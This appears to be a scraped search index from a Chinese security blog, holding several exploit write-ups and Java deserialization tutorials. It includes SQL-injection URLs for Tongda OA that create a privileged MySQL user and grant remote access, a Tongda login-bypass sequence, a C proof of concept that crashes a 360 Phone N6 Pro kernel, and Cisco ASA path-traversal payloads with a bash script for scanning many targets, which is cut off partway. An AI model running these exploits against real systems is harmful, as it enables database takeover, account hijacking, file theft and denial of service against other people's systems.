`Grant_priv` = 'Y', `References_priv` = 'Y', `Index_priv` = 'Y', `Alter_priv` = 'Y', `Show_db_priv` = 'Y', `Super_priv` = 'Y', `Create_tmp_table_priv` = 'Y', `Lock_tables_priv` = 'Y', `Execute_priv` = 'Y', `Repl_slave_priv` = 'Y', `Repl_client_priv` = 'Y', `Create_view_priv` = 'Y', `Show_view_priv` = 'Y', `Create_routine_priv` = 'Y', `Alter_routine_priv` = 'Y', `Create_user_priv` = 'Y', `Event_priv` = 'Y', `Trigger_priv` = 'Y', `Create_tablespace_priv` = 'Y', `ssl_type` = '', `ssl_cipher` = '', `x509_issuer` = '', `x509_subject` = '', `max_questions` = 0, `max_updates` = 0, `max_connections` = 0, `max_user_connections` = 0, `plugin` = 'mysql_native_password', `authentication_string` = '', `password_expired` = 'Y' WHERE `Host` = Cast('%' AS Binary(1)) AND `User` = Cast('ateam666' AS Binary(5)); 3、刷新数据库就可以登录到数据库啦。 1/general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges; 4、通达OA配置mysql默认是不开启外网访问的所以需要修改mysql授权登录。 123/general/hr/manage/query/delete_cascade.php?condition_cascade=grant all privileges ON mysql.* TO 'ateam666'@'%' IDENTIFIED BY 'abcABC@123' WITH GRANT OPTION 5、接下来就是考验mysql提权功底的时候啦 参考链接：https://mp.weixin.qq.com/s/8rvIT1y_odN2obJ1yAvLbw","link":"/2020/09/17/WEB/Exploit/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA-v11-7-%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/"},{"title":"通达OA任意用户登陆","text":"1、首先访问 /ispirit/login_code.php 获取 codeuid。 2、访问 /general/login_code_scan.php 提交 post 参数： uid=1&amp;codeuid={9E908086-342B-2A87-B0E9-E573E226302A} 然后构造数据包请求/logincheck_code.php 得到cookie","link":"/2020/09/15/WEB/Exploit/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86/"},{"title":"Java反序列化漏洞学习实践一-从Serializbale接口开始先弹一个计算器","text":"0x0、基本概念1、什么是序列化和反序列化 Serialization（序列化）是指把Java对象保存为二进制字节码的过程；反序列化deserialization是把二进制码重新转换成Java对象的过程。 2、什么情况下需要序列化 a）当你想把的内存中的对象保存到一个文件中或者数据库中时候； b）当你想用套接字在网络上传送对象的时候； c）当你想通过RMI传输对象的时候； 总之，序列化的用途就是传递和存储。 3、如何实现序列化 将需要序列化的类实现Serializable接口就可以了，Serializable接口中没有任何方法，可以理解为一个标记，即表明这个类可以被序列化。 序列化与反序列化都可以理解为“写”和“读”操作 ，通过如下这两个方法可以将对象实例进行“序列化”与“反序列化”操作。 123456789101112131415/** * 写入对象内容 */private void writeObject(java.io.ObjectOutputStream out)/** * 读取对象内容 */private void readObject(java.io.ObjectInputStream in) 4、一些注意点 当然，并不是一个实现了序列化接口的类的所有字段及属性，都是可以序列化的： 如果该类有父类，则分两种情况来考虑： 1.如果该父类已经实现了可序列化接口，则其父类的相应字段及属性的处理和该类相同； 2.如果该类的父类没有实现可序列化接口，则该类的父类所有的字段属性将不会序列化，并且反序列化时会调用父类的默认构造函数来初始化父类的属性，而子类却不调用默认构造函数，而是直接从流中恢复属性的值。 如果该类的某个属性标识为static类型的，则该属性不能序列化。 如果该类的某个属性采用transient关键字标识，则该属性不能序列化。 a）当一个父类实现序列化，子类自动实现序列化，不需要显式实现Serializable接口； b）当一个对象的实例变量引用其他对象，序列化该对象时也把引用对象进行序列化； 0x1、简单实例以下代码是一个简单的序列化和反序列化操作的demo。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374package 反序列化;import java.io.FileInputStream;import java.io.FileNotFoundException;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.io.Serializable;public class deserTest implements Serializable { //创建一个简单的可被序列化的类，它的实例化后的对象就是可以被序列化的 private static final long serialVersionUID = 1L; private int n; public deserTest(int n) { this.n=n; } @Override public String toString() { return &quot;deserTest [n=&quot; + n + &quot;, getClass()=&quot; + getClass() + &quot;, hashCode()=&quot; + hashCode() + &quot;, toString()=&quot; + super.toString() + &quot;]&quot;; } public static void main(String[] args) { deserTest x = new deserTest(5); operation.ser(x); operation.deser(); x.toString(); }}class operation{ public static void ser(Object obj) { //序列化操作，写操作 try { ObjectOutputStream ooStream = new ObjectOutputStream(new FileOutputStream(&quot;object.obj&quot;)); //ObjectOutputStream能把Object输出成Byte流 ooStream.writeObject(obj); ooStream.flush(); ooStream.close(); } catch (FileNotFoundException e) { e.printStackTrace(); }catch (IOException e) { // TODO: handle exception e.printStackTrace(); } } public static void deser() { //反序列化，读取操作 try { ObjectInputStream iiStream = new ObjectInputStream(new FileInputStream(&quot;object.obj&quot;)); Object xObject = iiStream.readObject(); System.out.println(xObject); iiStream.close(); } catch (FileNotFoundException e) { // TODO: handle exception e.printStackTrace(); }catch (IOException e) { // TODO: handle exception e.printStackTrace(); } catch (ClassNotFoundException e) { // TODO Auto-generated catch block e.printStackTrace(); } }} } catch (Exception e) { // TODO Auto-generated catch block e.printStackTrace(); } }} 0x2、自定义反序列化的行为–弹个计算器自定义序列化和反序列化过程，就是重写writeObject和readObject方法。 对以上代码进行改造，加入readObject方法的重写，再重写函数中加入自己的代码逻辑。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374package 反序列化;import java.io.FileInputStream;import java.io.FileNotFoundException;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.io.Serializable;public class deserTest2 implements Serializable { //创建一个简单的可被序列化的类，它的实例化后的对象就是可以被序列化的 private static final long serialVersionUID = 1L; private int n; public deserTest2(int n) { this.n=n; } @Override public String toString() { return &quot;deserTest2 [n=&quot; + n + &quot;, getClass()=&quot; + getClass() + &quot;, hashCode()=&quot; + hashCode() + &quot;, toString()=&quot; + super.toString() + &quot;]&quot;; } private void readObject(java.io.ObjectInputStream in) throws IOException,ClassNotFoundException{ in.defaultReadObject(); Runtime.getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;); System.out.println(&quot;test&quot;); } public static void main(String[] args) { deserTest2 x = new deserTest2(5); operation1.ser(x); operation1.deser(); x.toString(); }}class operation1{ public static void ser(Object obj) { //序列化操作，写操作 try { ObjectOutputStream ooStream = new ObjectOutputStream(new FileOutputStream(&quot;object.obj&quot;)); //ObjectOutputStream能把Object输出成Byte流 ooStream.writeObject(obj); ooStream.flush(); ooStream.close(); } catch (FileNotFoundException e) { e.printStackTrace(); }catch (IOException e) { // TODO: handle exception e.printStackTrace(); } } public static void deser() { //反序列化，读取操作 try { ObjectInputStream iiStream = new ObjectInputStream(new FileInputStream(&quot;object.obj&quot;)); Object xObject = iiStream.readObject(); System.out.println(xObject); iiStream.close(); } catch (FileNotFoundException e) { // TODO: handle exception e.printStackTrace(); }catch (IOException e) { // TODO: handle exception e.printStackTrace(); } catch (ClassNotFoundException e) { // TODO Auto-generated catch block e.printStackTrace(); } }} 总结： 这是一个极端的例子，在真实场景中，不会有人真的这样直接写一句执行命令的代码在readObject()中。但是一般会有其他的代码逻辑，如果它的代码逻辑里，如果有某一个分支有像method.invoke()这种可以调用其他函数的代码，那么就可以跳转过去，再从这个“其他函数”的角度去看有没有执行代码或调用其他函数的可能。这个“其他函数”也就是所谓的gadget了。 参考： http://www.cnblogs.com/xdp-gacl/p/3777987.html http://www.importnew.com/20125.html http://beautyboss.farbox.com/post/study/shen-ru-xue-xi-javaxu-lie-hua","link":"/2020/09/13/WEB/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5%E4%B8%80-%E4%BB%8ESerializbale%E6%8E%A5%E5%8F%A3%E5%BC%80%E5%A7%8B%E5%85%88%E5%BC%B9%E4%B8%80%E4%B8%AA%E8%AE%A1%E7%AE%97%E5%99%A8/"},{"title":"Java反序列化漏洞学习实践二-Java的反射机制（Java Reflection）","text":"学习Java的反射机制是为了理解Apache Commons Collections中的反序列化漏洞做准备的。 0x0、基础Java反射机制 指的是可以于运行时加载,探知和使用编译期间完全未知的类. 程序在运行状态中, 可以动态加载一个只有名称的类, 对于任意一个已经加载的类,都能够知道这个类的所有属性和方法; 对于任意一个对象,都能调用他的任意一个方法和属性; 加载完类之后, 在堆内存中会产生一个Class类型的对象(一个类只有一个Class对象), 这个对象包含了完整的类的结构信息,而且这个Class对象就像一面镜子,透过这个镜子看到类的结构,所以被称之为:反射. 每个类被加载进入内存之后,系统就会为该类生成一个对应的java.lang.Class对象,通过该Class对象就可以访问到JVM中的这个类. Class对象的获取方法 实例对象的getClass()方法; 类的.class(最安全/性能最好)属性;（如demo代码和下图） 运用Class.forName(String className)动态加载类,className需要是类的全限定名(最常用). 注意，有一点很有趣，使用功能”.class”来创建Class对象的引用时，不会自动初始化该Class对象，使用forName()会自动初始化该Class对象 0x1、通过反射方法调用函数该demo主要实践学习使用反射方法来调用类中的函数。 `` 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293package 反序列化2;import java.lang.reflect.Method;public class reflectionTest { public static void main(String[] args) { try{ //Class 获取类的方法一：事例化对象的getclass()方法； User testObject = new User(&quot;zhangsan&quot;,19); Class Method1Class = testObject.getClass(); //Class获取类的方法二：类的.Class(最安全/性能最好)属性;有点类似python的getattr()。java中每个类型都有class属性。 Class method2Class = User.class; //Class对象的获取方法三：运用Class.forName(String className)动态加载类，className需要是类的全限定名（最常用） //这种方法也最容易理解，通过类名（jar包中的完整namespace）就可以调用其中方法，也最符合我们需要的使用场景 //j2eeScan burp 插件就使用了这种反射机制 String path = &quot;反序列化2.User&quot;; Class method3Class = Class.forName(path); Method[] methods = method3Class.getMethods(); //通过类的class属性获取对应的Class类的对象，通过这个Class类的对象获取test类中的方法集合 /* String name = Method3Class.getName(); * int modifiers = Method3Class.getModifiers(); * .....还有很多方法 * 也就是说，对于一个任意的可以访问到的类，我们都能够通过以上这些方法来知道它的所有的方法和属性； * 知道了它的方法和属性，就可以调用这些方法和属性。 */ //调用User类中的方法 for(Method method: methods) { if(method.getName().equals(&quot;getName&quot;)) { System.out.println(&quot;method = &quot; + method.getName()); Class[] parameterTypes = method.getParameterTypes(); //获取方法的参数 Class returnType = method.getReturnType(); //获取方法的返回类型 try { User user = (User)method3Class.newInstance(); Object x = method.invoke(user); //user.getName; //Object x = method.invoke(new test(1), 666); //new关键字能调用任何构造方法,newInstance()只能调用无参构造方法。但反射的场景中是不应该有机会使用new关键词的。 System.out.println(x); } catch (Exception e) { // TODO: handle exception e.printStackTrace(); } } } Method method1 = method3Class.getMethod(&quot;setName&quot;, String.class); User user1 = (User)method3Class.getConstructor(String.class,Integer.class).newInstance(&quot;lisi&quot;,19); //调用自定义构造器的方法 Object x = method1.invoke(user1, &quot;李四&quot;);//第一个参数是类的对象。第二个参数是函数的参数 System.out.println(user1.getName()); }catch(Exception e) { e.printStackTrace(); } } }class User{ private Integer age; private String name; public User() {}; public User(String name,Integer age) { this.age = age; this.name = name; } public Integer getAge() { return age; } public void setAge(Integer age) { this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } } 0x2、通过反射方法弹个计算器step1中，我们通过重写readObject方法，直接在里面使用Runtime.getRuntime().exec(“calc.exe”)来执行代码。现在需要改造一下，使用反弹方法来实现，成功调试的代码如下。11 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081package 反序列化2;import java.io.FileInputStream;import java.io.FileNotFoundException;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.io.Serializable;import java.lang.reflect.Method;public class reflectionTest2 implements Serializable{ //创建一个简单的可被序列化的类，它的实例化后的对象就是可以被序列化的 private static final long serialVersionUID = 1L; private int n; public reflectionTest2(int n) { this.n=n; } @Override public String toString() { return &quot;reflectionTest2 [n=&quot; + n + &quot;, getClass()=&quot; + getClass() + &quot;, hashCode()=&quot; + hashCode() + &quot;, toString()=&quot; + super.toString() + &quot;]&quot;; } private void readObject(java.io.ObjectInputStream in) throws IOException,ClassNotFoundException{ try { Method method = java.lang.Runtime.class.getMethod(&quot;exec&quot;, String.class); Object result = method.invoke(Runtime.getRuntime(), &quot;open /System/Applications/Calculator.app&quot;); } catch (Exception e) { // TODO: handle exception e.printStackTrace(); } } public static void main(String[] args) { reflectionTest2 x = new reflectionTest2(5); operation.ser(x); operation.deser(); x.toString(); } }class operation{ public static void ser(Object obj) { //序列化操作，写操作 try { ObjectOutputStream ooStream = new ObjectOutputStream(new FileOutputStream(&quot;object.obj&quot;)); //ObjectOutputStream能把Object输出成Byte流 ooStream.writeObject(obj); ooStream.flush(); ooStream.close(); } catch (FileNotFoundException e) { e.printStackTrace(); }catch (IOException e) { // TODO: handle exception e.printStackTrace(); } } public static void deser() { //反序列化，读取操作 try { ObjectInputStream iiStream = new ObjectInputStream(new FileInputStream(&quot;object.obj&quot;)); Object xObject = iiStream.readObject(); System.out.println(xObject); iiStream.close(); } catch (FileNotFoundException e) { // TODO: handle exception e.printStackTrace(); }catch (IOException e) { // TODO: handle exception e.printStackTrace(); } catch (ClassNotFoundException e) { // TODO Auto-generated catch block e.printStackTrace(); } }} 执行结果： 0x3、通过setAccessible访问私有属性和函数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566 package 反序列化2;import java.lang.reflect.Constructor;import java.lang.reflect.Method;/* * 测试setAccessible方法，可以通过将它设置为true--setAccessible(true) 来访问private属性和函数。 * 而且可以提高程序的执行效率，因为减少了安全检查。 */public class reflectionTest3 { public static void main(String[] args){ try { String path = &quot;反序列化2.User3&quot;; Class clazz = Class.forName(path); //Method method = clazz.getMethod(&quot;setName&quot;,String.class); //getMethod只能获取public的方法，private的方法需要使用getDeclaredMethod来获取，并且设置setAccessible(true)才可以调用访问。 //参数属性也是一样。 Method method = clazz.getDeclaredMethod(&quot;setName&quot;, String.class); method.setAccessible(true); //Constructor strut = clazz.getConstructor(String.class,Integer.class); //getConstructor只能获取public的构造方法 Constructor strut = clazz.getDeclaredConstructor(String.class,Integer.class); strut.setAccessible(true); User3 user = (User3)strut.newInstance(&quot;bit4&quot;,19); //调用自定义构造器的方法 Object x = method.invoke(user,&quot;比特&quot;);//第一个参数是类的对象。第二参数是函数的参数 System.out.println(user.getName()); } catch (Exception e1) { e1.printStackTrace(); } }}class User3{ private Integer age; private String name; private User3() {} private User3(String name,Integer age){ //构造函数，初始化时执行 this.age = age; this.name = name; } private Integer getAge() { return age; } private void setAge(Integer age) { this.age = age; } public String getName() { return name; } private void setName(String name) { this.name = name; }} 0x4、思考总结程序的两大根本：变量与函数 所以总的来说，要想控制程序实现命令执行，有2个方向： 1.控制代码、函数：就像命名注入等注入类漏洞一样数据被当作了代码执行；或者和上面的demo代码一样重写readObject，加入自定义的代码（当然这种场景基本不存在，任意文件上传和执行勉强算是属于这种情况）。 2.控制输入、数据、变量：利用代码中已有的函数和逻辑，通过改变输入内容的形态实现流程的控制（不同的输入会走不同的逻辑流程，执行不同代码块中的代码）。 对于java反序列化漏洞，属于控制数据输入，它有2个基本点必须要满足： 1.有一个可序列化的类，并且该类是重写了readObject()方法的（由于不存在代码注入，只能查找已有代码逻辑中是否有这样的类）。 2.在重写的readObject()方法的逻辑中有 method.invoke函数出现，而且参数可控。 再稍作抽象： 1.有一个可序列化的类，并且该类是重写了readObject()方法的，除了默认的对象读取外，还有其他处理逻辑。（主线流程，反序列化漏洞都是这个主线逻辑流程，这是反序列化漏洞的入口点。） 2..在重写的readObject()方法的逻辑中有 直接或间接使用类似method.invoke这种可以执行调用任意方法的函数，而且参数可控。（是否还有其他函数可以达到相同的目的呢？） Apache Commons Collections 3.x 版本的 Gadget 构造过程 就是典型的例子。它的调用链如下： 1234567891011121314151617181920/* Gadget chain: ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() AbstractInputCheckedMapDecorator$MapEntry.setValue() TransformedMap.checkSetValue() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() Requires: commons-collections &lt;= 3.2.1*/ 参考： http://blog.csdn.net/liujiahan629629/article/details/18013523 http://blog.csdn.net/zjf280441589/article/details/50453776 http://ifeve.com/java-reflection/ Apache Commons Collections 3.x 版本的 Gadget调用链http://blog.knownsec.com/2015/12/untrusted-deserialization-exploit-with-java/)","link":"/2020/09/13/WEB/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5%E4%BA%8C-Java%E7%9A%84%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%EF%BC%88Java-Reflection%EF%BC%89/"},{"title":"Java反序列化漏洞学习实践三-理解java的动态代理机制","text":"0x0、基础代理的使用场景：某程序员入职公司接手了一个项目，他读源码发现某些地方可以增强，比如在某些函数执行前应该打印日志。如果他直接在原始代码的基础上直接修改容易出错，他的做法是：自己实现一个类，和原始类实现相同的接口（或者继承相同的类），通过在方法中引用老程序的方法来实现自己的方法，从而实现在不改动源代码的基础上达到增强方法的目的。 代理模式：为其他对象提供一种代理以便控制对这个对象的访问（所谓控制，就是可以在其调用行为前后分别加入一些操作）。 代理模式分类： 静态代理，其实质是类的继承或接口的实现，比较容易理解，注意结合场景。 动态代理（Jdk动态代理），这是我们需要关注的重点，在反序列化漏洞的场景中需要用到！ cglib动态代理 0x1、静态代理demo和理解`` 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&lt;code&gt;&lt;strong&gt;package 反序列化3;/* * 代理模式的简单demo，静态代理 * * 代理的使用场景：某程序员入职公司接手了一个项目，他读源码发现某些地方可以增强（比如在某些函数执行前应该打印日志）。 * 如果他直接在原始代码的基础上直接修改容易出错，他的做法是：自己实现一个类，和原始类实现相同的接口（或者继承相同的类）， * 通过在方法中引用老程序的方法来实现自己的方法，从而实现增强方法的目的。 */public class proxyTest { public static void main(String[] args) { //Subject sub = new RealSubject();//场景中得旧代码，老程序员写的。 Subject sub = new ProxySubject();//新入职的程序员，自己实现了ProxySubject类，然后改成了这句。来增强老程序的代码。 sub.request(); }}abstract class Subject//也可以是接口interface{//抽象角色：通过接口或抽象类声明真实角色实现的业务方法。 //类比网络代理，比如http代理，都支持http协议 abstract void request();}class RealSubject extends Subject{//真实角色：实现抽象角色，定义真实角色所要实现的业务逻辑，供代理角色调用。 //类比真实的http请求 public RealSubject()//默认构造方法 { } @Override public void request() { System.out.println(&quot;From real subject.&quot;); }}class ProxySubject extends Subject//关键是类的继承。{//代理角色：实现抽象角色，是真实角色的代理，通过真实角色的业务逻辑方法来实现抽象方法，并可以附加自己的操作。 //类比通过代理发出http请求，这个代理当然可以对http请求做出任何想要的修改。 private RealSubject realSubject; //以真实角色作为代理角色的属性 public ProxySubject() { } @Override public void request() //该方法封装了真实对象的request方法，老程序员的方法。 {//所谓的“控制”就体现在这里 preRequest(); if( realSubject == null ) { realSubject = new RealSubject(); } realSubject.request(); //此处执行真实对象的request方法 postRequest(); } private void preRequest() { //在请求前做某些处理，比如打印日志，修改请求包等等 System.out.println(&quot;Do something before requesting: print log,change request&quot;); } private void postRequest() { //在请求后做某些处理，打印日志 System.out.println(&quot;Do something after requesting: print log&quot;); } } &lt;/strong&gt;&lt;/code&gt;**运行演示：** 1**![img](https://leanote.com/api/file/getImage?fileId=5f350ee4ab644158a9000a0d)** 0x2、动态代理demo及理解但是静态代理这个模式本身有个大问题，如果类方法数量越来越多的时候，代理类的代码量是十分庞大的。比如为老程序员的所有代码都加上日志打印，难道老程序员实现过的所有类，新程序员都需要再实现一遍吗？ 所以引入动态代理来解决此类问题。JDK内置的Proxy动态代理可以在运行时动态生成字节码，而没必要针对每个类编写代理类。他只需实现一个InvocationHandler就可以了。 在java的动态代理机制中，有两个重要的类或接口：一个是 InvocationHandler(Interface)；另一个则是 Proxy(Class)，这一个类和接口是实现我们动态代理所必须用到的。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283package 反序列化3;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;/* * 动态代理的简单demo，动态代理利用了反射机制 * 每一个动态代理类都会有一个与之关联的invocation handler。真正的调用是在invocation handler的invoke()方法里完成的。 * 感谢蝶离飞、廖新喜2位师傅的指导 */public class proxyTest2{ public static void main(String[] args) { DynamicSubject sub=new RealDynamicSubject();//之前这里sub的类型是RealDynamicSubject，不对；但是为什么呢？ Handler handler = new Handler(sub); //newProxyInstance(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h) //CLassLoader loader:指定动态代理类的类加载器,即生成完成后的代理对象的类加载器 //Class&lt;?&gt; interfaces:指定动态代理类需要实现的所有接口，需要被增强的接口列表（数据） //InvocationHandler h: 指定与动态代理类关联的 InvocationHandler对象，具体的增强逻辑 DynamicSubject sub2 = (DynamicSubject)Proxy.newProxyInstance(DynamicSubject.class.getClassLoader(), new Class[]{DynamicSubject.class}, handler); DynamicSubject sub3 = (DynamicSubject)Proxy.newProxyInstance(DynamicSubject.class.getClassLoader(), sub.getClass().getInterfaces(), handler); DynamicSubject sub4 = (DynamicSubject)Proxy.newProxyInstance(DynamicSubject.class.getClassLoader(), RealDynamicSubject.class.getInterfaces(), handler); //从上面的调用方法可知，可以对不同的对象使用相同的模式实现来实现其代理，这就是相对静态代理的优势。 System.out.println(&quot;sub.getClass() = &quot;+sub.getClass()); System.out.println(&quot;DynamicSubject.class = &quot; +DynamicSubject.class); System.out.println(new Class[]{DynamicSubject.class}); System.out.println(RealDynamicSubject.class.getInterfaces()); sub2.request(); sub3.request(); sub4.request(); }}interface DynamicSubject{//抽象角色：通过接口或抽象类声明真实角色实现的业务方法。注意:动态代理只能是接口，否则代理类转成该类型事会报错 //类比网络代理，比如http代理，都支持http协议 abstract void request();}class RealDynamicSubject implements DynamicSubject{//真实角色：实现抽象角色，定义真实角色所要实现的业务逻辑，供代理handler处理调用。 //类比真实的http请求 public RealDynamicSubject() { } public void request() { System.out.println(&quot;From real subject.&quot;); }}/** * 处理器 */class Handler implements InvocationHandler{ private Object obj; //被代理的对象（也就是老程序员实现的对象），不管对象是什么类型；之前声明成RealDynamicSubject，不应该这么做 /** * 所有的流程控制都在invoke方法中 * proxy：代理类 * method：正在调用的方法，反射机制调用函数所必须！ * args：被调用方法的参数列表，反射机制调用函数所必须！ */ @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {//接口必须实现的方法，也是逻辑核心 System.out.println(&quot;Do something before requesting: print log&quot;); Object xxx = method.invoke(this.obj, args);//通过反射机制调用老程序员的对象代码。 System.out.println(&quot;Do something after requesting: print log&quot;); return xxx; } public Handler(Object obj) { //构造函数，把真实角色的实例传递进来,这个代理handler的目的就是增强它，或者说需要调用它来实现主要的功能。 this.obj = obj; }} 运行结果： 0x3、思考总结在后续将要学习的反序列化PoC构造过程中，我们需要用到这个动态代理机制，因为它提供一种【方法之间的跳转，从任意方法到invoke方法的跳转】，是我们将参数入口和代码执行联系起来的关键！ 本文代码下载地址： https://github.com/bit4woo/Java_deserialize_vuln_lab/tree/master/src/Step3 参考 http://www.runoob.com/design-pattern/design-pattern-intro.html https://www.cnblogs.com/xiaoluo501395377/p/3383130.html https://www.cnblogs.com/xiaoxi/p/5961093.html","link":"/2020/09/13/WEB/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5%E4%B8%89-%E7%90%86%E8%A7%A3java%E7%9A%84%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/"},{"title":"360 Phone N6 Pro内核漏洞","text":"一、漏洞简介 360 Phone N6 Pro V096内核组件中的内核模块允许攻击者使用命令3235427072在设备/ dev / block / mmcblk0rpmb上通过ioctl的自变量注入精心设计的自变量，并导致内核崩溃。 二、漏洞影响 名称：360 Phone N6 Pro 型号：1801-A01 安卓版本：7.1.1 版本号：V096 内核版本：Linux localhost 4.4.21-perf＃1 SMP PREEMPT Wed Mar 28 28 15:24:20 UTC 2018 aarch64 三、复现过程\u001f\u001f poc1234567891011121314151617181920212223242526272829303132333435/** This is poc of 360 N6 Pro, 1801-A01* Android Version: 7.1.1* Version Number: V096* Kernel Version: Linux localhost 4.4.21-perf #1 SMP PREEMPT Wed Mar 28 15:24:20 UTC 2018 aarch64* A NULL pointer bug in the ioctl interface of device file /dev/block/mmcblk0rpmb causes the system crash via IOCTL 3235427072.* This Poc should run with permission to do ioctl on /dev/block/mmcblk0rpmb.*/#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#include &lt;errno.h&gt;#include &lt;sys/ioctl.h&gt;const static char *driver = &quot;/dev/block/mmcblk0rpmb&quot;;static command = 3235427072; // 0xc0d8b300int main(int argc, char **argv, char **env) {int fd = 0;fd = open(driver, O_RDWR);if (fd &lt; 0) {printf(&quot;Failed to open %s, with errno %dn&quot;, driver, errno);system(&quot;echo 1 &gt; /data/local/tmp/log&quot;);return -1;}printf(&quot;Try ioctl device file '%s', with command 0x%x and payload NULLn&quot;, driver, command);printf(&quot;System will crash and reboot.n&quot;);if(ioctl(fd, command, NULL) &lt; 0) {printf(&quot;Allocation of structs failed, %dn&quot;, errno);system(&quot;echo 2 &gt; /data/local/tmp/log&quot;);return -1;}close(fd);return 0;}","link":"/2020/09/12/IOT/Exploit/360/360-Phone-N6-Pro%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E/"},{"title":"（CVE-2019-1663）Cisco 堆栈缓冲区溢出漏洞","text":"","link":"/2020/08/06/IOT/Exploit/Cisco/%EF%BC%88CVE-2019-1663%EF%BC%89Cisco%20%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"},{"title":"（CVE-2020-3452）Cisco ASAFTD 任意文件读取漏洞","text":"一、漏洞简介 Cisco Adaptive Security Appliance (ASA) 和 Cisco Firepower Threat Defense (FTD) 的 web 服务接口存在漏洞，允许未经身份验证的远程攻击者向受影响的设备发送一个精心制作的HTTP请求，成功利用该漏洞的攻击者能够进行目录遍历攻击并读取目标系统上的敏感文件。 该漏洞目前仅影响启用了AnyConnect或WebVPN配置的设备，并且此漏洞不能用于访问ASA或FTD系统文件或底层操作系统(OS)文件。 二、漏洞影响Cisco ASA：&lt;= 9.6Cisco ASA：9.7 , 9.8 , 9.9 , 9.10 , 9.12 , 9.13 , 9.14Cisco FTD：6.2.2 , 6.2.3 , 6.3.0 , 6.4.0 , 6.5.0 , 6.6.0 三、复现过程payload 1 /+CSCOT+/translation-table?type=mst&amp;textdomain=/%2bCSCOE%2b/portal_inc.lua&amp;default-language&amp;lang=../ payload 2 /+CSCOT+/oem-customization?app=AnyConnect&amp;type=oem&amp;platform=..&amp;resource-type=..&amp;name=%2bCSCOE%2b/portal_inc.lua poc 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596# Exploit Title: Cisco Adaptive Security Appliance Software 9.11 - Local File Inclusion# Google Dork: inurl:/+CSCOE+/# Date: 2020-08-27# Exploit Author: 0xmmnbassel# Vendor Homepage: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-ro-path-KJuQhB86# Version: Cisco ASA Software &gt;=9.14 except 9.11 Cisco FTD Software &gt;=6.2.2 and 6.2.3,6.3.0,6.4.0,6.50,6.60# Vulnerability Type: unauthenticated file read# CVE: CVE-2020-3452#!/bin/bashread=&quot;%2bCSCOE%2b/portal_inc.lua&quot;helpFunction(){ echo &quot;&quot; echo -e &quot;\\t\\tCVE-2020-3452&quot; echo &quot;&quot; echo &quot;Usage: $0 -l targets.txt -r %2bCSCOE%2b/portal_inc.lua &quot; echo -e &quot;\\t-l for list of IPs in text file&quot; echo -e &quot;\\t-r file to read, default: %2bCSCOE%2b/portal_inc.lua&quot; echo -e &quot;\\t-i for single IP test&quot; exit 1}while getopts &quot;l:r:i:&quot; optdo case &quot;$opt&quot; in l ) input=&quot;$OPTARG&quot; ;; r ) read=&quot;$OPTARG&quot; ;; i ) website=&quot;$OPTARG&quot; ;; ? ) helpFunction ;; esacdone#if $website is empty or $input is emptyif [ -z &quot;$website&quot; ] &amp;&amp; [ -z &quot;$input&quot; ]then echo &quot;Some/all of the parameters are empty&quot;; helpFunctionfi#usageif [ -z &quot;$website&quot;]; then while IFS= read -r line do name=$(echo $line | cut -c9-19) #echo &quot;testing $line&quot; filename=&quot;$name.txt&quot; #echo $response status=$(curl -LI $line&quot;/+CSCOT+/oem-customization?app=AnyConnect&amp;type=oem&amp;platform=..&amp;resource-type=..&amp;name=&quot;$read -o /dev/null 